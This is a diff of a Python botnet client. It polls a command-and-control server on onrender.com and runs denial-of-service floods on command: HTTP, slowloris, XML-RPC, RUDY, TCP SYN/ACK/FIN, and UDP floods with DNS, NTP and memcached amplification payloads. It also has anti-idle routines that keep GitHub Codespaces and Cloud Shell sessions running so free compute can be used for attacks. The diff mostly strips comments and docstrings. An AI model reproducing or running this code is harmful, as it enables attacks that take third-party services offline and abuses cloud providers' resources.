@@ -1,20 +1,3 @@
-"""
-ENHANCED BOT CLIENT WITH ANTI-IDLE PROTECTION
-==============================================
-Features:
-- Auto-connects to https://c2-server-io.onrender.com/
-- Resource-friendly (prevents overload)
-- Optimized thread management (50-300 threads)
-- Custom user agents from server
-- Optional proxy support
-- Works in GitHub Codespaces & Google Cloud Shell
-- Persistent connection with auto-reconnect
-- ANTI-IDLE PROTECTION: Prevents Codespace/Cloud Shell timeout
-
-Install: pip install requests psutil
-Run: python client.py
-"""
-
 import threading
 import time
 import sys
@@ -42,12 +25,9 @@ try:
     import psutil
 except ImportError:
     psutil = None
-    print("[!] Warning: psutil not available - limited system monitoring")
 
 
 class AntiIdleManager:
-    """Prevents Codespace/Cloud Shell from timing out due to inactivity"""
-    
     def __init__(self):
         self.running = False
         self.thread = None
@@ -55,18 +35,18 @@ class AntiIdleManager:
         self.idle_prevention_enabled = self.environment in ['github-codespaces', 'google-cloud-shell']
         
     def detect_environment(self):
-        """Detect cloud environment"""
         if 'CODESPACE_NAME' in os.environ:
             return 'github-codespaces'
         elif 'CLOUD_SHELL' in os.environ:
             return 'google-cloud-shell'
         elif os.path.exists('/.dockerenv'):
             return 'docker'
+        elif os.path.exists('/data/data/com.termux'):
+            return 'termux-android'
         else:
             return 'local'
     
     def start(self):
-        """Start anti-idle background tasks"""
         if not self.idle_prevention_enabled:
             return
         
@@ -76,13 +56,11 @@ class AntiIdleManager:
         print(f"[+] Anti-Idle Protection: ENABLED for {self.environment}")
     
     def stop(self):
-        """Stop anti-idle tasks"""
         self.running = False
         if self.thread:
             self.thread.join(timeout=2)
     
     def _anti_idle_worker(self):
-        """Background worker to prevent idle timeout"""
         idle_activities = [
             self._touch_dummy_file,
             self._ping_localhost,
@@ -95,33 +73,24 @@ class AntiIdleManager:
         
         while self.running:
             try:
-                # Rotate through different activities
                 activity = idle_activities[activity_index % len(idle_activities)]
                 activity()
-                
                 activity_index += 1
-                
-                # Activity every 60 seconds
                 time.sleep(60)
-                
             except Exception as e:
-                print(f"[!] Anti-idle error: {e}")
                 time.sleep(60)
     
     def _touch_dummy_file(self):
-        """Touch a dummy file to show filesystem activity"""
         try:
             dummy_file = '/tmp/.bot_keepalive'
             with open(dummy_file, 'a') as f:
                 f.write(f'{time.time()}\n')
-            # Keep file small
             if os.path.exists(dummy_file) and os.path.getsize(dummy_file) > 1024:
                 os.remove(dummy_file)
         except:
             pass
     
     def _ping_localhost(self):
-        """Ping localhost to show network activity"""
         try:
             subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
                          stdout=subprocess.DEVNULL, 
@@ -131,7 +100,6 @@ class AntiIdleManager:
             pass
     
     def _check_disk_usage(self):
-        """Check disk usage"""
         try:
             if psutil:
                 psutil.disk_usage('/')
@@ -144,7 +112,6 @@ class AntiIdleManager:
             pass
     
     def _list_processes(self):
-        """List processes to show CPU activity"""
         try:
             if psutil:
                 list(psutil.process_iter(['pid', 'name']))[:10]
@@ -157,7 +124,6 @@ class AntiIdleManager:
             pass
     
     def _network_check(self):
-        """Network connectivity check"""
         try:
             socket.create_connection(("8.8.8.8", 53), timeout=2)
         except:
@@ -166,7 +132,6 @@ class AntiIdleManager:
 
 class EnhancedBot:
     def __init__(self):
-        # Auto-connect configuration
         self.server_url = "https://c2-server-io.onrender.com"
         
         self.bot_id = self.generate_bot_id()
@@ -177,15 +142,12 @@ class EnhancedBot:
         self.connection_retries = 0
         self.max_retry_delay = 300
         
-        # Anti-idle manager
         self.anti_idle = AntiIdleManager()
         
-        # Session pool for performance
         self.session_pool = []
         self.pool_size = 30
         self.init_session_pool()
         
-        # System specs
         self.specs = {
             'bot_id': self.bot_id,
             'cpu_cores': self.get_cpu_count(),
@@ -216,7 +178,6 @@ class EnhancedBot:
         self.display_banner()
     
     def init_session_pool(self):
-        """Create pool of reusable sessions"""
         for _ in range(self.pool_size):
             session = requests.Session()
             session.verify = False
@@ -233,61 +194,41 @@ class EnhancedBot:
             self.session_pool.append(session)
     
     def get_session(self):
-        """Get a session from the pool"""
         return random.choice(self.session_pool)
     
     def get_cpu_count(self):
-        """Get CPU count"""
         try:
             if psutil:
                 return psutil.cpu_count()
-            else:
-                with open('/proc/cpuinfo', 'r') as f:
-                    return sum(1 for line in f if line.startswith('processor'))
-        except:
             return os.cpu_count() or 4
+        except:
+            return 4
     
     def get_cpu_freq(self):
-        """Get CPU frequency"""
         try:
             if psutil and psutil.cpu_freq():
                 return round(psutil.cpu_freq().max, 2)
-            else:
-                with open('/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq', 'r') as f:
-                    return round(int(f.read().strip()) / 1000, 2)
+            return 0.0
         except:
             return 0.0
     
     def get_ram_gb(self):
-        """Get total RAM"""
         try:
             if psutil:
                 return round(psutil.virtual_memory().total / (1024**3), 1)
-            else:
-                with open('/proc/meminfo', 'r') as f:
-                    for line in f:
-                        if line.startswith('MemTotal'):
-                            kb = int(line.split()[1])
-                            return round(kb / (1024**2), 1)
+            return 0.0
         except:
             return 0.0
     
     def get_ram_available(self):
-        """Get available RAM"""
         try:
             if psutil:
                 return round(psutil.virtual_memory().available / (1024**3), 1)
-            else:
-                with open('/proc/meminfo', 'r') as f:
-                    for line in f:
-                        if line.startswith('MemAvailable'):
-                            kb = int(line.split()[1])
-                            return round(kb / (1024**2), 1)
+            return 0.0
         except:
             return 0.0
     
     def check_internet_connection(self):
-        """Check if internet is available"""
         try:
             socket.create_connection(("8.8.8.8", 53), timeout=3)
             return True
@@ -303,7 +244,6 @@ class EnhancedBot:
         return False
     
     def wait_for_internet(self):
-        """Wait until internet connection is available"""
         print("\n[X] No internet connection detected")
         print("[...] Waiting for internet connection...")
         
@@ -315,12 +255,10 @@ class EnhancedBot:
         time.sleep(2)
         
     def calculate_retry_delay(self):
-        """Calculate exponential backoff delay"""
         delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
         return delay
         
     def display_banner(self):
-        """Display bot information"""
         print("\n" + "="*60)
         print("  ENHANCED BOT CLIENT v3.1 - ULTRA FAST + ANTI-IDLE")
         print("="*60)
@@ -349,13 +287,11 @@ class EnhancedBot:
         print("\n" + "="*60 + "\n")
         
     def generate_bot_id(self):
-        """Generate unique bot ID"""
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0,2*6,2)][::-1])
         return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
     
     def get_network_info(self):
-        """Get network interface information"""
         try:
             if psutil:
                 interfaces = []
@@ -375,14 +311,15 @@ class EnhancedBot:
             return []
     
     def check_cpu_usage(self):
-        """Check current CPU usage to prevent overload"""
         if psutil:
-            cpu_percent = psutil.cpu_percent(interval=0.5)
-            return cpu_percent < 90  # Don't overload if CPU is above 90%
+            try:
+                cpu_percent = psutil.cpu_percent(interval=0.5)
+                return cpu_percent < 90
+            except:
+                return True
         return True
     
     def check_approval(self):
-        """Check if bot is approved"""
         try:
             data = {
                 'bot_id': self.bot_id,
@@ -406,7 +343,6 @@ class EnhancedBot:
         return False
     
     def get_commands(self):
-        """Poll for commands"""
         try:
             response = requests.get(
                 f"{self.server_url}/commands/{self.bot_id}", 
@@ -423,7 +359,6 @@ class EnhancedBot:
         return []
     
     def send_status(self, status, message):
-        """Send status update"""
         try:
             uptime_current = int(time.time() - self.stats['uptime'])
             
@@ -450,7 +385,6 @@ class EnhancedBot:
             pass
     
     def get_proxy_dict(self, proxy_str):
-        """Convert proxy string to requests proxy dict"""
         if not proxy_str:
             return None
         
@@ -469,7 +403,6 @@ class EnhancedBot:
             return None
     
     def execute_command(self, cmd):
-        """Execute command"""
         cmd_type = cmd.get('type')
         
         print(f"\n{'='*60}")
@@ -486,12 +419,10 @@ class EnhancedBot:
             elif cmd_type == 'udp_flood':
                 self.cmd_udp_flood(cmd)
             elif cmd_type == 'slowloris':
-                # Map slowloris to http_flood with SLOWLORIS type
                 cmd['method'] = 'GET'
                 cmd['attack_type'] = 'SLOWLORIS'
                 self.cmd_http_flood(cmd)
             elif cmd_type == 'wordpress_xmlrpc':
-                # Map wordpress to http_flood with XMLRPC type
                 cmd['attack_type'] = 'XMLRPC'
                 self.cmd_http_flood(cmd)
             elif cmd_type == 'layer7':
@@ -508,12 +439,10 @@ class EnhancedBot:
             self.send_status('error', str(e))
     
     def cmd_ping(self):
-        """Respond to ping"""
         self.send_status('success', 'pong')
         print("[OK] Pong!")
     
     def cmd_http_flood(self, cmd):
-        """ULTRA-FAST HTTP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 100)
@@ -524,7 +453,6 @@ class EnhancedBot:
         ])
         proxies = cmd.get('proxies', [])
         
-        # Limit threads based on CPU to prevent overload
         max_threads = min(threads, 300)
         if not self.check_cpu_usage():
             max_threads = min(max_threads, 100)
@@ -548,7 +476,6 @@ class EnhancedBot:
         success_count = [0]
         
         def flood_worker():
-            """Attack worker with multiple vectors"""
             end_time = time.time() + duration
             session = self.get_session()
             
@@ -585,14 +512,12 @@ class EnhancedBot:
                                        timeout=3, verify=False, proxies=proxy_dict)
                     
                     elif attack_type == 'SLOWLORIS':
-                        # Slow headers attack
                         headers['X-a'] = str(random.randint(1, 9999))
                         r = session.get(target, headers=headers, timeout=30, 
                                       verify=False, proxies=proxy_dict, stream=True)
                         time.sleep(10)
                     
                     elif attack_type == 'BYPASS':
-                        # Cache bypass
                         bypass_headers = headers.copy()
                         bypass_headers.update({
                             'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
@@ -604,7 +529,6 @@ class EnhancedBot:
                                       timeout=3, verify=False, proxies=proxy_dict)
                     
                     elif attack_type == 'XMLRPC':
-                        # XML-RPC flood
                         xml_data = f'''<?xml version="1.0"?>
 <methodCall>
   <methodName>pingback.ping</methodName>
@@ -619,7 +543,6 @@ class EnhancedBot:
                                        data=xml_data, timeout=3, verify=False, proxies=proxy_dict)
                     
                     elif attack_type == 'RUDY':
-                        # Slow POST
                         headers['Content-Type'] = 'application/x-www-form-urlencoded'
                         headers['Content-Length'] = '1000000'
                         r = session.post(target, headers=headers, data='A'*100,
@@ -627,7 +550,6 @@ class EnhancedBot:
                         time.sleep(5)
                     
                     else:
-                        # Default GET
                         r = session.get(target, headers=headers, timeout=3, 
                                       verify=False, proxies=proxy_dict)
                     
@@ -635,13 +557,8 @@ class EnhancedBot:
                     if r.status_code < 500:
                         success_count[0] += 1
                     
-                    # ULTRA FAST - NO DELAY for maximum speed
-                    # time.sleep(0.001 if attack_type not in ['SLOWLORIS', 'RUDY'] else 0)
-                    
                 except:
                     request_count[0] += 1
-                    # Minimal delay on error
-                    # time.sleep(0.01)
         
         print(f"[+] Launching {max_threads} attack threads...")
         
@@ -676,7 +593,6 @@ class EnhancedBot:
         self.send_status('success', f'{attack_type}: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
     
     def cmd_tcp_flood(self, cmd):
-        """OPTIMIZED TCP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 75)
@@ -708,7 +624,6 @@ class EnhancedBot:
         request_count = [0]
         
         def tcp_worker():
-            """TCP worker - ULTRA FAST"""
             end_time = time.time() + duration
             
             while time.time() < end_time and attack_id in self.active_attacks:
@@ -717,34 +632,28 @@ class EnhancedBot:
                     sock.settimeout(1)
                     
                     if attack_type == 'SYN':
-                        # SYN flood attempt
                         sock.connect((host, port))
                         sock.close()
                     
                     elif attack_type == 'ACK':
-                        # ACK flood
                         sock.connect((host, port))
                         sock.send(b'\x00' * 256)
                         sock.close()
                     
                     elif attack_type == 'FIN':
-                        # FIN flood
                         sock.connect((host, port))
                         sock.shutdown(socket.SHUT_WR)
                         sock.close()
                     
-                    else:  # CONNECT
+                    else:
                         sock.connect((host, port))
                         payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
                         sock.send(payload)
                         sock.close()
                     
                     request_count[0] += 1
-                    # ULTRA FAST - NO DELAY
-                    # time.sleep(0.01)
                 except:
                     request_count[0] += 1
-                    # time.sleep(0.05)
         
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             futures = [executor.submit(tcp_worker) for _ in range(max_threads)]
@@ -764,7 +673,6 @@ class EnhancedBot:
         self.send_status('success', f'TCP {attack_type}: {request_count[0]:,} conn')
     
     def cmd_udp_flood(self, cmd):
-        """OPTIMIZED UDP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 75)
@@ -796,32 +704,25 @@ class EnhancedBot:
         request_count = [0]
         
         def udp_worker():
-            """UDP worker - ULTRA FAST"""
             end_time = time.time() + duration
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
             while time.time() < end_time and attack_id in self.active_attacks:
                 try:
                     if attack_type == 'DNS':
-                        # DNS amplification
                         payload = b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(50)
                     
                     elif attack_type == 'NTP':
-                        # NTP amplification
                         payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
                     
                     elif attack_type == 'MEMCACHED':
-                        # Memcached amplification
                         payload = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
                     
-                    else:  # FLOOD
-                        # Standard UDP flood
+                    else:
                         payload = os.urandom(random.randint(512, 2048))
                     
                     sock.sendto(payload, (host, port))
                     request_count[0] += 1
-                    # ULTRA FAST - NO DELAY
-                    # time.sleep(0.001)
                 except:
                     pass
             
@@ -845,24 +746,24 @@ class EnhancedBot:
         self.send_status('success', f'UDP {attack_type}: {request_count[0]:,} packets')
     
     def cmd_layer7(self, cmd):
-        """Layer 7 attacks"""
         attack_type = cmd.get('attack_type', 'BROWSER')
         
         if attack_type in ['BROWSER', 'API', 'SEARCH', 'LOGIN']:
-            # Delegate to HTTP flood with modifications
             self.cmd_http_flood(cmd)
         else:
             self.cmd_http_flood(cmd)
     
     def cmd_sysinfo(self):
-        """System info"""
         info_lines = []
         
         if psutil:
-            cpu_percent = psutil.cpu_percent(interval=1)
-            mem = psutil.virtual_memory()
-            info_lines.append(f"CPU: {cpu_percent}%")
-            info_lines.append(f"RAM: {mem.percent}% ({mem.used/(1024**3):.1f}GB/{mem.total/(1024**3):.1f}GB)")
+            try:
+                cpu_percent = psutil.cpu_percent(interval=1)
+                mem = psutil.virtual_memory()
+                info_lines.append(f"CPU: {cpu_percent}%")
+                info_lines.append(f"RAM: {mem.percent}% ({mem.used/(1024**3):.1f}GB/{mem.total/(1024**3):.1f}GB)")
+            except:
+                info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
         else:
             info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
         
@@ -877,7 +778,6 @@ class EnhancedBot:
         self.send_status('success', info)
     
     def cmd_stop_all(self):
-        """Stop all attacks"""
         print(f"[!] Stopping all attacks...")
         
         with self.attack_lock:
@@ -888,13 +788,10 @@ class EnhancedBot:
         self.send_status('success', f'Stopped {count}')
     
     def run(self):
-        """Main loop with auto-reconnect"""
-        # Start anti-idle protection
         self.anti_idle.start()
         
         while self.running:
             try:
-                # Check internet connection first
                 if not self.check_internet_connection():
                     self.wait_for_internet()
                     self.connection_retries = 0
@@ -902,7 +799,6 @@ class EnhancedBot:
                 print(f"\n[*] Connecting to server: {self.server_url}")
                 print(f"[*] Waiting for auto-approval...\n")
                 
-                # Wait for approval with reconnect logic
                 self.approved = False
                 
                 while not self.approved:
@@ -947,7 +843,6 @@ class EnhancedBot:
                 
                 print(f"[+] Active. Listening for commands...\n")
                 
-                # Main command loop with reconnect
                 while self.running and self.approved:
                     try:
                         if not self.check_internet_connection():
